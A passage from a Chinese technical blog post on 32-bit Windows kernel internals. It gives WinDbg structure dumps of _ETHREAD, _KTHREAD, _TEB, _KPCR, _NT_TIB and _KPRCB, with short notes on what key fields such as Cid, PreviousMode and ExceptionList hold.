Ptr32 _ETHREAD   <span class="token operator">+</span><span class="token number">0x1dc</span> KeyedWaitValue   <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x1e0</span> ActiveTimerListLock <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x1e4</span> ActiveTimerListHead <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x1ec</span> Cid              <span class="token operator">:</span> _CLIENT_ID   <span class="token operator">+</span><span class="token number">0x1f4</span> LpcReplySemaphore <span class="token operator">:</span> _KSEMAPHORE   <span class="token operator">+</span><span class="token number">0x1f4</span> KeyedWaitSemaphore <span class="token operator">:</span> _KSEMAPHORE   <span class="token operator">+</span><span class="token number">0x208</span> LpcReplyMessage  <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x208</span> LpcWaitingOnPort <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x20c</span> ImpersonationInfo <span class="token operator">:</span> Ptr32 _PS_IMPERSONATION_INFORMATION   <span class="token operator">+</span><span class="token number">0x210</span> IrpList          <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x218</span> TopLevelIrp      <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x21c</span> DeviceToVerify   <span class="token operator">:</span> Ptr32 _DEVICE_OBJECT   <span class="token operator">+</span><span class="token number">0x220</span> ThreadsProcess   <span class="token operator">:</span> Ptr32 _EPROCESS   <span class="token operator">+</span><span class="token number">0x224</span> StartAddress     <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x228</span> Win32StartAddress <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x228</span> LpcReceivedMessageId <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x22c</span> ThreadListEntry  <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x234</span> RundownProtect   <span class="token operator">:</span> _EX_RUNDOWN_REF   <span class="token operator">+</span><span class="token number">0x238</span> ThreadLock       <span class="token operator">:</span> _EX_PUSH_LOCK   <span class="token operator">+</span><span class="token number">0x23c</span> LpcReplyMessageId <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x240</span> ReadClusterSize  <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x244</span> GrantedAccess    <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x248</span> CrossThreadFlags <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x248</span> Terminated       <span class="token operator">:</span> Pos <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> DeadThread       <span class="token operator">:</span> Pos <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> HideFromDebugger <span class="token operator">:</span> Pos <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> ActiveImpersonationInfo <span class="token operator">:</span> Pos <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> SystemThread     <span class="token operator">:</span> Pos <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> HardErrorsAreDisabled <span class="token operator">:</span> Pos <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> BreakOnTermination <span class="token operator">:</span> Pos <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> SkipCreationMsg  <span class="token operator">:</span> Pos <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> SkipTerminationMsg <span class="token operator">:</span> Pos <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x24c</span> SameThreadPassiveFlags <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x24c</span> ActiveExWorker   <span class="token operator">:</span> Pos <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x24c</span> ExWorkerCanWaitUser <span class="token operator">:</span> Pos <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x24c</span> MemoryMaker      <span class="token operator">:</span> Pos <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x250</span> SameThreadApcFlags <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x250</span> LpcReceivedMsgIdValid <span class="token operator">:</span> Pos <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x250</span> LpcExitThreadCalled <span class="token operator">:</span> Pos <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x250</span> AddressSpaceOwner <span class="token operator">:</span> Pos <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x254</span> ForwardClusterOnly <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x255</span> DisablePageFaultClustering <span class="token operator">:</span> UChar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Cid：包含所属进程ID和线程ID；</li><li>ThreadsProcess：指向所属进程；</li><li>ThreadListEntry：包含所有线程的双向链表；</li><li><em><strong>TCB</strong></em>：线程控制块；</li><li><em><strong>TEB</strong></em>：线程环境块；</li></ul><h4 id="TCB"><a href="#TCB" class="headerlink" title="TCB"></a>TCB</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _KTHREADnt<span class="token operator">!</span>_KTHREAD   <span class="token operator">+</span><span class="token number">0x000</span> Header           <span class="token operator">:</span> _DISPATCHER_HEADER   <span class="token operator">+</span><span class="token number">0x010</span> MutantListHead   <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x018</span> InitialStack     <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x01c</span> StackLimit       <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x020</span> Teb              <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x024</span> TlsArray         <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x028</span> KernelStack      <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x02c</span> DebugActive      <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x02d</span> State            <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x02e</span> Alerted          <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x030</span> Iopl             <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x031</span> NpxState         <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x032</span> Saturation       <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x033</span> Priority         <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x034</span> ApcState         <span class="token operator">:</span> _KAPC_STATE   <span class="token operator">+</span><span class="token number">0x04c</span> ContextSwitches  <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x050</span> IdleSwapBlock    <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x051</span> Spare0           <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x054</span> WaitStatus       <span class="token operator">:</span> Int4B   <span class="token operator">+</span><span class="token number">0x058</span> WaitIrql         <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x059</span> WaitMode         <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x05a</span> WaitNext         <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x05b</span> WaitReason       <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x05c</span> WaitBlockList    <span class="token operator">:</span> Ptr32 _KWAIT_BLOCK   <span class="token operator">+</span><span class="token number">0x060</span> WaitListEntry    <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x060</span> SwapListEntry    <span class="token operator">:</span> _SINGLE_LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x068</span> WaitTime         <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x06c</span> BasePriority     <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x06d</span> DecrementCount   <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x06e</span> PriorityDecrement <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x06f</span> Quantum          <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x070</span> WaitBlock        <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> _KWAIT_BLOCK   <span class="token operator">+</span><span class="token number">0x0d0</span> LegoData         <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x0d4</span> KernelApcDisable <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0d8</span> UserAffinity     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0dc</span> SystemAffinityActive <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x0dd</span> PowerState       <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x0de</span> NpxIrql          <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x0df</span> InitialNode      <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x0e0</span> ServiceTable     <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x0e4</span> Queue            <span class="token operator">:</span> Ptr32 _KQUEUE   <span class="token operator">+</span><span class="token number">0x0e8</span> ApcQueueLock     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0f0</span> Timer            <span class="token operator">:</span> _KTIMER   <span class="token operator">+</span><span class="token number">0x118</span> QueueListEntry   <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x120</span> SoftAffinity     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x124</span> Affinity         <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x128</span> Preempted        <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x129</span> ProcessReadyQueue <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x12a</span> KernelStackResident <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x12b</span> NextProcessor    <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x12c</span> CallbackStack    <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x130</span> Win32Thread      <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x134</span> TrapFrame        <span class="token operator">:</span> Ptr32 _KTRAP_FRAME   <span class="token operator">+</span><span class="token number">0x138</span> ApcStatePointer  <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> Ptr32 _KAPC_STATE   <span class="token operator">+</span><span class="token number">0x140</span> PreviousMode     <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x141</span> EnableStackSwap  <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x142</span> LargeStack       <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x143</span> ResourceIndex    <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x144</span> KernelTime       <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x148</span> UserTime         <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x14c</span> SavedApcState    <span class="token operator">:</span> _KAPC_STATE   <span class="token operator">+</span><span class="token number">0x164</span> Alertable        <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x165</span> ApcStateIndex    <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x166</span> ApcQueueable     <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x167</span> AutoAlignment    <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x168</span> StackBase        <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x16c</span> SuspendApc       <span class="token operator">:</span> _KAPC   <span class="token operator">+</span><span class="token number">0x19c</span> SuspendSemaphore <span class="token operator">:</span> _KSEMAPHORE   <span class="token operator">+</span><span class="token number">0x1b0</span> ThreadListEntry  <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x1b8</span> FreezeCount      <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x1b9</span> SuspendCount     <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x1ba</span> IdealProcessor   <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x1bb</span> DisableBoost     <span class="token operator">:</span> UChar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>InitialStack、StackLimit 、KernelStack：用于线程切换；</li><li>State：指示线程状态；</li><li>ApcState、ApcQueueLock、ApcStatePointer、SavedApcState：APC相关；</li><li>Waitblock：正在等待的对象；</li><li>ServiceTable：指向TSS；</li><li>TrapFrame：指向栈帧；</li><li>PreviousMode：程序调用时的权限；</li></ul><h4 id="TEB"><a href="#TEB" class="headerlink" title="TEB"></a>TEB</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _TEBnt<span class="token operator">!</span>_TEB   <span class="token operator">+</span><span class="token number">0x000</span> NtTib            <span class="token operator">:</span> _NT_TIB   <span class="token operator">+</span><span class="token number">0x01c</span> EnvironmentPointer <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x020</span> ClientId         <span class="token operator">:</span> _CLIENT_ID   <span class="token operator">+</span><span class="token number">0x028</span> ActiveRpcHandle  <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x02c</span> ThreadLocalStoragePointer <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x030</span> ProcessEnvironmentBlock <span class="token operator">:</span> Ptr32 _PEB   <span class="token operator">+</span><span class="token number">0x034</span> LastErrorValue   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x038</span> CountOfOwnedCriticalSections <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x03c</span> CsrClientThread  <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x040</span> Win32ThreadInfo  <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x044</span> User32Reserved   <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0ac</span> UserReserved     <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0c0</span> WOW32Reserved    <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x0c4</span> CurrentLocale    <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0c8</span> FpSoftwareStatusRegister <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0cc</span> SystemReserved1  <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">54</span><span class="token punctuation">]</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x1a4</span> ExceptionCode    <span class="token operator">:</span> Int4B   <span class="token operator">+</span><span class="token number">0x1a8</span> ActivationContextStack <span class="token operator">:</span> _ACTIVATION_CONTEXT_STACK   <span class="token operator">+</span><span class="token number">0x1bc</span> SpareBytes1      <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x1d4</span> GdiTebBatch      <span class="token operator">:</span> _GDI_TEB_BATCH   <span class="token operator">+</span><span class="token number">0x6b4</span> RealClientId     <span class="token operator">:</span> _CLIENT_ID   <span class="token operator">+</span><span class="token number">0x6bc</span> GdiCachedProcessHandle <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x6c0</span> GdiClientPID     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x6c4</span> GdiClientTID     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x6c8</span> GdiThreadLocalInfo <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x6cc</span> Win32ClientInfo  <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">62</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x7c4</span> glDispatchTable  <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">233</span><span class="token punctuation">]</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xb68</span> glReserved1      <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0xbdc</span> glReserved2      <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xbe0</span> glSectionInfo    <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xbe4</span> glSection        <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xbe8</span> glTable          <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xbec</span> glCurrentRC      <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xbf0</span> glContext        <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xbf4</span> LastStatusValue  <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0xbf8</span> StaticUnicodeString <span class="token operator">:</span> _UNICODE_STRING   <span class="token operator">+</span><span class="token number">0xc00</span> StaticUnicodeBuffer <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">261</span><span class="token punctuation">]</span> Uint2B   <span class="token operator">+</span><span class="token number">0xe0c</span> DeallocationStack <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xe10</span> TlsSlots         <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xf10</span> TlsLinks         <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0xf18</span> Vdm              <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xf1c</span> ReservedForNtRpc <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xf20</span> DbgSsReserved    <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xf28</span> HardErrorsAreDisabled <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0xf2c</span> Instrumentation  <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xf6c</span> WinSockData      <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xf70</span> GdiBatchCount    <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0xf74</span> InDbgPrint       <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0xf75</span> FreeStackOnTermination <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0xf76</span> HasFiberData     <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0xf77</span> IdealProcessor   <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0xf78</span> Spare3           <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0xf7c</span> ReservedForPerf  <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xf80</span> ReservedForOle   <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xf84</span> WaitingOnLoaderLock <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0xf88</span> Wx86Thread       <span class="token operator">:</span> _Wx86ThreadState   <span class="token operator">+</span><span class="token number">0xf94</span> TlsExpansionSlots <span class="token operator">:</span> Ptr32 Ptr32 Void   <span class="token operator">+</span><span class="token number">0xf98</span> ImpersonationLocale <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0xf9c</span> IsImpersonating  <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0xfa0</span> NlsCache         <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xfa4</span> pShimData        <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xfa8</span> HeapVirtualAffinity <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0xfac</span> CurrentTransactionHandle <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0xfb0</span> ActiveFrame      <span class="token operator">:</span> Ptr32 _TEB_ACTIVE_FRAME   <span class="token operator">+</span><span class="token number">0xfb4</span> SafeThunkCall    <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0xfb5</span> BooleanSpare     <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> UChar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-3-KPCR"><a href="#1-3-KPCR" class="headerlink" title="1.3 KPCR"></a>1.3 KPCR</h3><p>包含处理器控制相关的信息。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _KPCRnt<span class="token operator">!</span>_KPCR   <span class="token operator">+</span><span class="token number">0x000</span> NtTib            <span class="token operator">:</span> _NT_TIB   <span class="token operator">+</span><span class="token number">0x01c</span> SelfPcr          <span class="token operator">:</span> Ptr32 _KPCR   <span class="token operator">+</span><span class="token number">0x020</span> Prcb             <span class="token operator">:</span> Ptr32 _KPRCB   <span class="token operator">+</span><span class="token number">0x024</span> Irql             <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x028</span> IRR              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x02c</span> IrrActive        <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x030</span> IDR              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x034</span> KdVersionBlock   <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x038</span> IDT              <span class="token operator">:</span> Ptr32 _KIDTENTRY   <span class="token operator">+</span><span class="token number">0x03c</span> GDT              <span class="token operator">:</span> Ptr32 _KGDTENTRY   <span class="token operator">+</span><span class="token number">0x040</span> TSS              <span class="token operator">:</span> Ptr32 _KTSS   <span class="token operator">+</span><span class="token number">0x044</span> MajorVersion     <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x046</span> MinorVersion     <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x048</span> SetMember        <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x04c</span> StallScaleFactor <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x050</span> DebugActive      <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x051</span> Number           <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x052</span> Spare0           <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x053</span> SecondLevelCacheAssociativity <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x054</span> VdmAlert         <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x058</span> KernelReserved   <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x090</span> SecondLevelCacheSize <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x094</span> HalReserved      <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0d4</span> InterruptMode    <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0d8</span> Spare1           <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x0dc</span> KernelReserved2  <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x120</span> PrcbData         <span class="token operator">:</span> _KPRCB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>NtTib：线程信息块；<br>Prcb：指向扩展结构KPRCB；<br>IDT、GDT：指向描述符表基址；<br>TSS：指向TSS；<br>Number：CPU编号；<br>PrcbData：扩展结构；</p><h4 id="NT-TIB"><a href="#NT-TIB" class="headerlink" title="NT_TIB"></a>NT_TIB</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _NT_TIBntdll<span class="token operator">!</span>_NT_TIB   <span class="token operator">+</span><span class="token number">0x000</span> ExceptionList    <span class="token operator">:</span> Ptr32 _EXCEPTION_REGISTRATION_RECORD   <span class="token operator">+</span><span class="token number">0x004</span> StackBase        <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x008</span> StackLimit       <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x00c</span> SubSystemTib     <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x010</span> FiberData        <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x010</span> Version          <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x014</span> ArbitraryUserPointer <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x018</span> Self             <span class="token operator">:</span> Ptr32 _NT_TIB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ExceptionList：异常链表；</li></ul><h4 id="KPRCB"><a href="#KPRCB" class="headerlink" title="KPRCB"></a>KPRCB</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _KPRCBnt<span class="token operator">!</span>_KPRCB   <span class="token operator">+</span><span class="token number">0x000</span> MinorVersion     <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x002</span> MajorVersion     <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x004</span> CurrentThread    <span class="token operator">:</span> Ptr32 _KTHREAD   <span class="token operator">+</span><span class="token number">0x008</span> NextThread       <span class="token operator">:</span> Ptr32 _KTHREAD   <span class="token operator">+</span><span class="token number">0x00c</span> IdleThread       <span class="token operator">:</span> Ptr32 _KTHREAD   <span class="token operator">+</span><span class="token number">0x010</span> Number           <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x011</span> Reserved         <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token 